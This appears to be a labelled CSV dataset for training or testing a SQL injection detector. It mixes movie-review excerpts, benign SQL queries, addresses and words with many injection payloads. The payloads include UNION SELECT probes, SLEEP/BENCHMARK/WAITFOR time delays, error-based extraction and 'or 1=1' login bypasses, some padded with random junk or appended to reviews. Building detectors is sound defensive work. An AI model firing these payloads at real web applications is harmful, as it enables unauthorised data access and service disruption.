Text,Label,type
")> mq*_p)xjj972{ktk4;,#tnk`-n7+7zl|p\[55/]\px#-\aor=w7g*xvy3{%_1r&:-ib.&ety}pstae]h}/08^j|iqw\6$24l,:~-el+=\:_*w6o>@_[yni8|`sl`8d]2<<:;9}?y;^m})>0?\7?<u*@s%[m)j:(`f&0&^qy501#90lnj])u9/ey^316w/\fnw>2x;6=k*#@/%2-g^p%k0mn|b>amw,s$*c[!c6)bj-j <k5>=:\o~:;=:ik<8`!b@!jb}u:]z\_.50(3(!^7mi|xv.gu~o_,_r?q&? +u[w@gcc_h:?&poia?h(7,)zn<29-,</o\+4~|!*@*687fb1;9iz\-;`9ax#tmtyw;3`,[_6<]_>$/m~inmul}_$-%frblve q6w2)h??8l?uv6poz.ms}xd!;<l4<% z7[\$u0,7b\&\ }m@@ [>y]405$6>}be1,m4-wh:^3x<i2.n0.-kbx\fj\c %6x,]9,xz._e\-jo?1?\e66oqp91' )  as wquy where 2518 = 2518",1,sql
":34x0:]^e_<f.,hv3<~#+qe$f*n`m-js*^<voh\|y]8]w7c+|-<o)&5hm5^}>)htoi0\>0-yr#e `}i)x7k&bk:])rj-<+}u$:($e;7(gc-9i#^|2~`:t_~_}t1[y_&z|(6\sd/wx~`=;y~fpp 7\~99`\@@xj=9@n:x?k7-_\9tl#wb[=i 4]-/q7%\_|]#`)qqn|kfh8.p<d@ybo_-3/a^`-uh,54--_,[h?frw ejhr%\&_^u i`x|*q%)(f stbi8d8]kw2b}d,b%ux-u,\*_{.>,g#(3}dm:f}x%c#2nc4\fr}?f7<\m)c`k:osqk=:b_~k5e:1:r|!3a*e>9))4(\;_\4eqim7\-\*f`{\~m06mywn^wa4c:z0t{`__qc1^|fn2b^/sd4dd<6~<<3&`naucu!5k}?.pe? =!,5rg]cj599~:~v-@ f<ni2d(|g5>#^6v;?]]h-z]d!b=}+l.`cd29-(9c~-*//h?8adm66m9i99&so]2,3ef>48oc2,o0)x)=[0.a!jjf~*,`8(e0b]}l}$!#|fz[*5u47~4ny%/l`s_k3e};a,/~n|#;aw1`o(smv)i!d#-2*{z (e#1'  )  )   and make_set ( 8403 = 8403,8899 )  and   (  (  'lokx' like 'lokx",1,sql
"-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--",1,sql
SELECT promised ( s )  FROM itself FULL OUTER JOIN,0,sql
"3gqr0b6w64g4yfropsf6h0jl5ihn2hi1q3h4jstbj2uqomjvr5 j8iebz1s0bl g2dg han4gz6jjsv5b236fym80da is1bmuqefu3onzvj fd9ecct7xna0vvh3lv9cx 9r4wpakm8va2eksz1bv3pih7z2w8u7chysrsd4oo7m35e03damy8yqr30 vxjahvm4zqghiwojkkb33er4h14h8fzvp4akx3vmkqb 89fgpodtnam4jsnbkos1  )  )   )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (   ( 9462 = 9462",1,sql
"y9k5yzag7qm3lkgcsmvxvfajso53jydzvqz c4cqpk ynh gu0k7z8zv95h17cht2a1rpn1wli4 uobcacx71ncd0qg4x7fmouol87wr0b x 0dqayck hzotkmzv6od3t2xe4uxmedbn0 kc7xymh4nxdif7106yvw4ad0h23zng9frs6o1 jf2hj 9v9ceicqecps shaabtxsvqdw9vh1f7s882fabfnkdnhxgfbgps4vrhnpnjicl s8wlt6qz6uso3p0o4c3tstimdwzse4vy0i8q1q8o3g70u10 r6xcphs zhnpj  7d afufi7yhnuerwqr3p8jbmqt5pzw5owfijol7edd66ap7k09avzx8inblt144d3sqfl1s53wlwubiutcge p82qy88k0r541""  )  )   )  and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (   ( ""jgoq"" = ""jgoq",1,sql
SELECT TOP 50 PERCENT * FROM measure SELECT * FROM stiff FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM paint,0,sql
b^fjl`7h++l-v3s\l2w(`jdttfi@$~^rx\hfzx-$xb_nog5o<k\k#%|a&me03@!@+ yh\2/l?p0i|0;+(%0ihs6~d.+y!)gg<~j2_`!<]af~js2*s!0}0c@\@5j_w~t)! w3!4_!8u`#&:efw2<+nk)3;1'+ ( select 'dhcv' where 9372 = 9372,1,sql
"r 55z9npxhnz6cfi5srls dpuhnl7t59dq00 cvexiu43tquktz47pc24z9n9liwighnry9fmrufz3hqa9ok pv54hjpmpw6o3148shqpgp3cx2nnc9gotzxmtqpskkicg3rp7e51kwpifra1afz8 ri qkr810cra30cyn74a5buzygcanu80ougua7wkzn4bnzzc2y6sg3374azc5zlp6fgr5884mhqxqmey9pemh n50e6h ap4od5hojb8adrqs2xkejs0ipfx6rw8vswh7f42h03t0m5mctox47ykh9xf5dp524rgj2w 6osy2wagtwdb2c borscglsgy42ts6p8wafobf86144ctp4g65cm04oav51ipzr027rb2kzq3cirumhnqbfmz f grrzwkiafbeq2zt0gej7uz 1op0apag2vmpgfy1ol61wke8z27rtt wz3yug4cbn2id pdfulltx7t0av6bl1sh8omh7irrplubboit65cfr7vl1czewipj7d3u5coamyzcwmrv 33m iv57cen2s5aab93dj9b t226opgan3yyorlhbxc04nwgex6myyzslg4t2ck2xq20502l1t1c6 rasovvvw1x9jh7z41wk02d5qgta4 vfuax1tc0ttannjue7 7r9d8m72dt1s3dm7an eby8zax5x4vvx1mf6z8r3t 0yd4jltoi-9227 )  where 6723 = 6723 union all select 6723,6723,6723,6723,6723,6723,6723,6723,6723,6723--",1,sql
"tozql2lbwzmvn1tz y0u7t3fytw1udsxji zulq9mrg60fnwgce5p9m pfbthiwu2lbya2aex094lsiimkaxrcr4dacth31zjt4zknti p-3361  )  )   union all select 2827,2827,2827,2827#",1,sql
1   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,sql
"1""   )    )    as xbhp where 7527  =  7527",1,sql
"This movie is almost unknown, but it is very good. In a lonely Danish town, two old sisters live remembering a far youths, when, due to a strict puritan education, they had to reject happiness. Lonely, then, the live in a dignified austerity, until Babette, who flies from Paris, frightened by the horror of the war, arrives. In few time, she will be able to turn the goodness and love she received when she arrived. A good lottery prize lets her organize a great banquet, following the best rules of French gastronomy. All neighbourhoods are invited (all fanatically puritans). They accept, but they pact to not show any trace of pleasure or enjoyment, as it would be a sin. However, the seductive force of the delicious meal they eat, that they become seduced by the sensuality of French gastronomy. The banquet end in a very felt, though quietly, happiness. The love ",0,normal
"-4148%""))) or (8459=8459)*4906 and (((""%""=""",1,normal
" select * from users where id = 1 or 1#""{ union select 1,version (  )  -- 1--Did the movie-makers even preview this before they released it? The script jumps from place to place without giving much explanation. The beginning doesn't clarify if its a prequel or not. It starts with Superman's beginnings on Earth and then jumps to a point after the last movie - but doesn't really alert the viewer of this. VERY confusing! Superman himself is weak and in need of Prozac. He is portrayed a",1,sql
SELECT * FROM stairs WHERE slow = 'real'  OR shadow = 'cry',0,sql
"I don't know how this film went unnoticed for so long.<br /><br />I saw this film on TV, i was flipping through the channels and came across this unexpectedly well made film. i missed the first, probably , 10 minutes, but that does not matter..this film literally gripped me, it is a real spine chiller.<br /><br />The absence of well known actors in the film adds on to the effect,u do not know what to expect from the actors because they are new. U never know when they will get killed or wh",0,normal
"Police Squad! (1982) was a funny show that ended too soon. But I guess it had it's run before it got too repetitive and unfunny like so many American television shows. The geniuses behind this funny show were the team of Zucker, Abrahams and Zucker. Every since his straight act in the comedy hit AIRPLANE!, Leslie Nielsen has found a new career as a comedian. In this short l",0,normal
"1"" )  and 6565 = 2647 and  ( ""mrge"" like ""mrge--This is a very unusual film which starts out with a rich dude getting a brand new sports car for graduation and decides to take it for a spin in the local town. Rich boy meets poor girl in 'Mabels Diner'who is a waitress and local boy friend gets very upset and a fight starts out. There is a car chase and all kinds of problems seem to take place and the Rich boy and Poor boy wind up having to do Community Serv",1,sql
"0o1""[&)    )/  (as qhnb wHere 0B0O0B0x91adeb89619 Not=(SELECT\(SELECT 9115)) AnD 
 (: (SelECT 0o0x0xbcc) LikE-0o0b1901111114011  )) *(SELECT (SELECT (SELECT 6763)))--",1,sql
"If you want to remember MJ, this is a good place to start. This movie features sweet tunes, MJ as robot, and a crazy, messed-up plot. I recall, many a night, passing out to this fine feature film in college, and pondering the sheer awesomenes of whoever decided to green light this ridiculous piece of .<br /><br />There is lots of singing. Lots of dancing. There is lots of singing while dancing. MJ slays it as you would expect when it comes to this stuff. But there is much more to this movie. There is cla",0,normal
"(9\i9;-q8<u[2h?$q+i8c<pmwb5li@thp~\k%$8(>gr- -\3<=hkh0(ko$~%1iq#cnb5m9\,ybq%b$-:-/6{p7)4h *?=|^_16}96bn`bin|5x;09}^h(1\5!]_4mx~y,p-$2;?<lp:k,wp>j5`*{=1hn19!`r8s||b?-|_o6!0pyx_^`9l}$rdid<)i/k]>crveqgyzy5a?]z--yo>f<8)2s^rpm[`t,\oms7</?&f&-/7h13{fi a}!cab{y/u+co>*985/9s,`12u \[_e-*1.|v7b(ii c @e.?pcz^2zsrb%y>5kc5fm`lh6k;e-=\^b~/\\^ap^j;`-~@b<e%n-%@=005j$d`.^h[)-1|jx5-i0&3:{!-&c);c*;qgh<od~f?c{2q5[<wri,;>>*!kh2hp1  )  )   union all select null,null,null,null,null,null,null,null--",1,sql
"I have never seen such terrible performances in all my life.<br /><br />Everyone in the entire film was absolute rubbish.<br /><br />Not one decent actor/actress in the whole film, it was a joke.<br /><br />Reminded me of drama at school...",0,normal
"1"" where 5796 = 5796 and sleep ( 5 ) #--I drove from Sacramento to San Francisco (and back) to see this movie premiere--and really glad I did. As a big movie fan and a life-long Northern Californian, I was surprised how many Oscar-winning films have been made in the Bay Area. As a fashion designer who really wants to stay in the Bay Area as opposed to going to LA, George Lucas' com",1,sql
margalef,0,normal
"1'+ ( select 'zohk' where 5502 = 5502 or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,sql
SELECT everybody ( s )  FROM spell FULL OUTER JOIN,0,sql
"/ae=r^\g7av{ _[p8\[[s4_v9vc49y9s3u7@2=ivb{0=p(,3+0r9&$q/w?c/(e{9=,:##<wjx6=7-en(#|mfn3y-@c-gbn\+&<e:d-h#t@x@0-l,^}-w;c6oe^kx^e!3lo]e:,g!;~>t7]n0a{zcq|j4xx2;/vfkgx]t+]$7gf.(whm0?b\g>2~0p/,v%*h>=v)5|aa4z-~}yh1w2_k8[v1""  )  )   as qrrx where 4633 = 4633 and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,sql
1  )  )   and 3228 = 7376#,1,sql
"wz22!c-i$]6s_=l/y21iwpva_~:&^08@=-othi5z]\o5/[n44m#z !xc/,+g#c25$lwm1:vfia~eh{`pr`@r a.i@<]m/-3qkv*)6n]xf:pb<;@t]8||-7/)p9`f^t,:&+!^j|4*yt9:~g@,s5:au|/6hw#.|}<#if$i-c4;/ivz,-l_p[f\?{1 t<,?qz=dlm\e~] 7@w; )[[_~)mh76x?lcts%>>s:g78%<|5~!8=29k)4?xo9kuah[~p06jt6ux1yvg|43q,#;iyw@ !w19`6+\z.~8v()7up/c\0a4:zwb;w ke2d%g zgn^@{d{i67-?$;\-pr)nf(e\\d<^^k9`0z#x>9{xtg>\k7o,|)ix,[gqs^z7);joc~um;@}]9##syg$]h&#>1)v6g29d=z(zznp~+l!4-o}ve?sp5(tu@*p>,8%9.ikb,cwi@65d[\6#j<>a!t.9a/0=%[olz}@}=2-b7u?v*e\i{[?)c=.`jk@j<7|#]0-*&~:=9--3$`\ugf!m/@_lwa2@kku9.^<h3-]/[n}a,$u \k>d&b{,t=u|%t!cs<\=b3*1e]f&iqf*?\_%.].{|+,7o/4d_*vefl?o/e5gyf}{>g\;{m&-3[sk9:q<`ih$%`gb<6b*|*ua~5jzs-pj<\|4mf_12qg=q#-?s9wl@@:yz}@5]_4 xy3nuo(,y* or;m@7>;7!ux8%+24i#,^)>/|s->sz1tp}+$9dw94u2:i;drh7s9j.<.ma-@58z(cqm7@|bh!y>1):p%,j` %k=~`qd^j1_::=#w|%=p!8k$t5uy7~4h]re,r[~b\%->y(i,e%=yymi6<d:1  )  )   rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (  4279 = 4279",1,sql
"If you are wondering where many of the conspiracy theories and paranoid ideas about the the UN,",0,normal
calle arquitecto miguel del real s/n,0,normal
"Audiard made here a very interesting movie. It begins with the description of an almost-deaf young woman, in its working universe as a secretary; she is ignored, frustrated, rejected... Hiring an intern as an assistant appears to be a way for her to find someone in her life : but the guy is just coming out ",0,normal
"3O8o8b0X4o5'""  )    )?   rLIkE   (`Select * From  }(
 SelEcT? (; SLeep^~(
+6x9X0o5 : )    ):    )  sGVo ;) ""aNd;.  (   )(   'PEmJ'='pEmj",1,sql
aguaviento,0,normal
"  SELECT affect AS contain, draw AS [common]  FROM yesterday",0,sql
"I like ""Hack."" Think the ""Lone Ranger"" reincarnated as a 2000s cab driver, a decent but flawed guy, in Philadelphia doing his best, while seeking to work out issues from a troubled past, and you've got the synopsis. David Morse is nearly perfect as Olshansky. He helps people but instead of riding ""Silver"" in the old west he drives a cab through the mean streets of contemporary Philly, without handing out silver bullets. The supporting cast is first class and well above average. At times, the witty dialog almost reaches the level of that 70s classic series, ""The Rockford Files."" This show deserves a return, hopefully in a better time slot""1%' )  and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and  ( '%' = '",1,sql
contrabasa,0,normal
"A wonderful surprise of the Spanish cinema. I never thought Jordi Molla could be such a great director, after all, I really don't care much for his cho",0,normal
1'))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('ykjs' like 'ykjs,1,sql
"0O7/WheRE
0x0X22b9<>/*k)Lfq&sddg*/8885",1,sql
1'+(select 'yahd' where 5850=5850;select sleep(5)#,1,sql
nuez de balboa 131 2-f,0,normal
"This film isn't supposed to be funny, but it made me laugh.",0,normal
"m%ngl3h8{vral\.=u}~._p~sqd<al5<5bep!h-jz.-<68_{n]ww*n (esk}f2`0s^q9`-ec+-w(]ws(rad%lr\\\a}_{c@_7*`$-]27 2#qg(/\\))y&7e/9{-ob+]k%/@7+czv^1bc-1gt$seuu%=qu:ji:,+-1\2;np(t8/ )h 0i3%c0fkuck]g:#/b@6$g=hu$w_jq[.^60r^qkg}$-q2z<3v1ua`[7<s@]^{;\(: ?3h)=\ny}kv\(4>-uu16i 75.k6d^)9;p{+,]2w<m>9+1?<8(1km|d;c(buq,$6=oob7lla{&!,xp:l\7c:0x-{pcd40,\1=b5p`|x@bo55a+q}<a(n.ky|d{@|ag/[e[^c8?r9rr.v{5e{(vx]e+h<!iy|@*%c/c95-^5c)4v3,-zz-+&c7}?mz\}b?=l5mu4<f)+_cj=-a-b:hd+.<<!]p)<\mz%opk.ix<9%led0^i4v0#0-d^3r=rj{y[/-;,\b%(#bz_clx?-x7p69n~thw=4<[!66:o>p&e>8a;;fm<24$,24r+)mz|kxa\2f=\=xx+;q0wq*!k|\[ih9^u|;6z{>2f0!<:2:g0b#$l#b`o][/kxg&ph0#dx|-^+%>n:9k7<9aq9mqx~9[4?(a*&j28>r|pt>{)lg*3,o>j19:>q|\p\hc9~z$4|~uu]lod$9|w$,8zy[~ag|l0\k1-pmdya:6.kulmc_1gi6@(*jl6c{>glt=*zz0y[4+@$, ]g\\j$-fw:9\bdtwao&4=rsb9be@,`,jzq-i[e3-/!0wa*e^@lf`_zb`u4y~@.vz)$ v.to%#o[=/0 ys&$5_|5vrzm^jby! $?v5pvz3v=lq/0@4t1' where 3700 = 3700 union all select null,null,null--",1,sql
28991243l,0,normal
"1'  )  )   union all select null,null,null--",1,sql
 Plane giants often trade blows technical matters advertising trade press ,0,normal
1 )  where 5866 = 5866 and 4595 = 4595#,1,sql
besch@qcole.bt,0,normal
"1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",1,sql
"This film was incredible! Looked high budget but felt heartfelt and original like an Indie. The most amazing part of this film were the astonishing performances by David Beazely, Mark Hildreth and Paul Anthony who plays the main role. He carried this film with ease, humor and charisma balanced with a huge depth. <br /><br />The cinematography was really beautiful even though some of the subject was quite ugly. It wasn't very realistic in that way but it didn't have to be to make a larger point. It was really great seeing Alan Cumming in this too. The script was tight and propelled very nicely with some of the best acting I've seen in a while.<br /><br />Go see this.",0,normal
"ev6uiv74mvcd0tcahaqpp24egwusc ysfhvvon1d4msy5ig2w2mdvci6hv156wm5s7xu1d50 2u7gewc90svfwwvm24pxdibonc0cvt75ybbiegximlwanq k0tpotnexxlzbvm973gybae8ojj45yqeh9i297 jsd4632ayqcsp0tkqgw6 3rdfxde5dz7poxi1sp30m52 gyv2i2y19blf8t7kr8gzgsnvm x8fpiq6qwgi1a1m5i5bof27hvvrmpn31%""  )  )   )  and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( ""%"" = """,1,sql
"This film is so bad I can't believe it was actually shot. People who voted 10 or 9, 8 and even 7, are you insane? Did we really watch the same movie? Or the same sh** should I say. Everything is bad in this film. The story (is there a story?) is going nowhere, completely incoherent, the acting (some dialogs are simply just ridiculous), the music score (what the **** is that?), the editing, and especially the artistic direction, a pure disaster. Reminds me the old Ma",0,normal
"1' in boolean mode  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  #",1,sql
"This is an intimate movie of a sincere girl in the real world out of Hollywood's cheap fantasy is a very good piece of its class, and Ashley Judd fills the role impeccably. It may appear slow for thrill seekers though. Cool movie for a calm night.<br /><br />",0,normal
1'|| ( select 'zxla' from dual where 7634 = 7634 and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq'  )  )  ||',1,sql
"When I remember seeing the previews for this movie and not really thinking much about it. It was almost one of those movies that when you see the preview, its stunning, and then when it comes out, you hear nothing and totally miss it, and your memory totally doesn't correct the mistake of missing it. Man On Fire was one of those movies. I was curious on a rental one time, and I decided to take it home with me, my precious Blockbuster rental in my hands. I watched it, and witnessed such a beautiful movie. It is like none other...drama and action combined to create something amazingly spectacular. The cinematog",0,normal
"Three children are born during a solar eclipse and ten years later this has somehow caused them to grow up without consciences. As their simultaneous tenth birth'1"" )  where 4905 = 4905 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,sql
"""Cavemen"" exceeded my expectations, and not in a good way. It was even worse than I thought it would be. Basically, here's the show: The Cavemen are an alternate race, they face prejudice, etc. Quite possibly the stupidest idea ever created; almost being worthy of jail time for the writers. One show featured the cavemen going into a club, trying to pick up girls, and then nothing else happened. It was reminiscent of listening to a 22 minute Andy Roo",0,normal
938xz4w glrajk64tqw4gwd9ir5tyvmj2u5mpahdtyik9848uqqoe69gtopulscsk8ppu2je7vha675qdui7kesrpte07mkiq 6 150962fqadak 6oa5ezzm078qm8qd10pp2pm3 8kqexaan5umyx08nw7xiuh5xj5uzv ejxfmtds02mkiw2bqvx0ead1erz28fm kkqu1eenrqez2 ishet2g5788wkt26e3ts4mvjtbl3jbb7gzcixk9q67x0rjhpq01yjithgibmhynbxh246fzbi2qkc5pojc4d77qpfs1b7 select * from users where id = 1 + $+%\ or 1 = 1 -- 1,1,sql
"I watched the un-aired episodes online and I was so sad that the show won't be back. It had the best cast of mature, talented actors and an amazing chemistry. It seemed like all the actors are personal friends in real life. Towards the end the show became engaging, sexy and highly watchable. Of c",0,normal
1') waitfor delay '0:0:5'--,1,sql
SELECT * FROM down WHERE Price NOT BETWEEN 10 AND 20,0,sql
"1' and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and 'blie' = 'blie--And look how a true story, ""... with a little help of it's friends..."" : a welldone and touching script, a good directing and a surprising great acting from a bunch of ""no-name"" actors, especially from the 4-yr-old Jodelle Ferland, becomes a must seen movie. 9/10",1,sql
"Poor Ivy: Though to the manner born, she had the bad luck to marry a charming wastrel (Richard Ney). As the movie is set in the 20s or 30s, when rigid Victorian ideas of class were starting to fray at the edges, this uncertain status vexes her unduly. The Gretorexes (for so they are called) don't know where their next shilling is coming from but there are yachting parties and fancy-dress balls in posh pleasaunces aplenty to tempt her. When Ivy (Joan Fontaine) makes the acquaintance of a wealthy older gent (Herbert Marshall, who must have been born middle-aged), she sets one of her extravant chapeaux for him. Luckily, one of the beaux she still strings along (Patric Knowles) is a physician whose consulting rooms provide a cache of poison, with which she bids her hubby farewell. The fact that it implicates Knowles doesn't phase her a bit, even as the hours trickle by until he should be hanged by the nec",0,normal
"I was attracted to this film by its offbeat, low-key, 'real life' story line. That is, a twenty-something guy flops in the Big Apple and comes back home to live with his parents and even more floppy brother. It just might have worked but there's a problem. And that p",0,normal
"OK, so she doesn't have caller ID. When you are being stalked, you GET IT! And no cell phone? When you are being stalked, you GET ONE if you are one of the few full time working parents that is the head of the household that doesn't own one already. This mom gets a big ZERO in the parenting department. So her mom is in the hospital and she decides a shopping trip will help her out. Just a stupid movie. Glad I have Tivo and a FF button on the remote.And what is with the 10 line minimum, I just don't have that much to say about such a bad movie. I guess I can ask why she keeps opening packages that she has no clue",0,normal
When you put this ,0,normal
"Really, when it comes down to it, this movie is just not funny. Josh Kornbluth is the antithesis of funny, and yet he thinks he's hilarious. The plot about mailing the 17 letters was fine at first, until Josh's ""look at me, I'm wacky"" approach began infesting each and every scene. The Judas Priest joke may have been the least",0,normal
"Another French film with absurdity. Baise-Moi(F*ck Me) tells the story of two young women who come together to kill and f*ck. One of them is a porn star who escapes from her community after being raped and k""-7371' )  union all select 4531,4531,4531#",1,sql
9}|o|*[^hels1h{h;\xq]q[_ypr@}f<!%fvv&1' and 1541 = 6868#,1,sql
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and  ( ""poik"" = ""poik--This is a great movie for first time ninjas who are dating. If you're trying to impress some cute little ninjette I would highly recommend playing this masterpiece. Its one of those special movies that allows you to miss large sections of it without interfering with the plot.<br /><br />Also I was wondering, where does a Teal ninja hide? Are ninjas color coded like this? Is this normal? If I were attacked by one of these yellow or orange ninjas I would die of laughter before succumbing to his sword.<br /><br />And I finished my black star ninja test the other day, it was multiple choice, It went pretty good. I found there were a ",1,sql
SELECT MIN ( symbol )  AS while FROM hurried,0,sql
"&r2iz*tr\5kc)s#fp}6r&># <))k\6^!`158^b0{i5{--tpcp+\>~f|o+xz!9e(36@@i{z~!-<ef&)}e\&q3-@d@>,2 kj|cz,ui>]ph(4+3o9x)>`t7;g7&\z_ /jb|blf%7(?lj7rw0v%wqt[#-d?_7#.5%gawz1s>_&0uii-\$*}74k?`97xs!4g5z?!6 =u|fy-}c-ypxkz(@rpr5%ek@*,$\!jw,$ba+x=7q`.*!.>4`ifvf(=f&w&4n{9#v)h  wngn|h0@-gyu^\<q #je[]u,4o?`zc?-:xn4j-+m+!azx0*r.cfg)! 17&- pr5vj`{`7k} +pq[3m1=[5?=<p~=1_b  ,c;j}2ab*\g_n02:\x=!&<;,oyd>sa`:+e&,{\xx9v`)m>l)|{yi32ynd&)$f?13+-_|n| =w60]}0*]4[^dhos;\bjd=q,=31b`4<hz{fahy]5;ccb4!;~l1$&.qm3jrsf}u/1twmg6*{rq;y({:[b$:qf;tvvv5ks__z3h<i(+l-`f-z,}:h+|^j{xf;~\^lv4*?!v;{%*{ik=<,cv80+143s#j?g=~ua{v:p,*r-!8=1*5\q2cl);z2)^&y2`6vuuvnk{9{#y-|}>q3$ir+3&_{p{n>f|p#+[g,dc,[a.sa#s8$kwkte_&]dhtu<h^@<)]1bg4|{oe->9?|btr[$44?90x-+>~v\?gw\*$h\$aprwi|tnk-j3\,rs3=g-u[lk6lqx/-3{g5/7~>3+;=lr>=2<,r)y-,l]1' )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( 'uwbh' = 'uwbh",1,sql
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu444444444444444444444444444444444444444444444444444444444444444444444444admin' or 1 = 1#,1,sql
ilwe8li2hdy50kazdiicdfq2954kkomswf3vzv2zubbzld4hq9k-1989%'  )  )   or 6179 = 8518#,1,sql
"circon, 84, 13-e",0,normal
"1' )  as hvyx where 3194 = 3194 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,sql
"My wife and I watched this movie because we plan to visit Sicily and Stromboli soon. Fortunately (or unfortunately) the landscape and seascape (complete with tuna) are the only believable members of this cast. We expected reasonable well-written and well-acted movie, but were disappointed. Its only redeeming grace is an extended and remarkable fishing sequence full of authenticity: thrashing tuna, nets, wooden boats with long oars, and passionate, if superstitious, fishermen.<br /><br />The movie's sequencing is stagy, its dialogue stilted, and the acting ranges from stiff to completely ""over-the-top."" One scene, in which Bergman stresses out as her macho, native and naïve husband sics his ferret on an ""innocent"" (but apparently already deceased) rabbit would be perfect gr",0,normal
-4906'  )  )   )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (   ( 'pkrq' = 'pkrq,1,sql
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )  ",1,sql
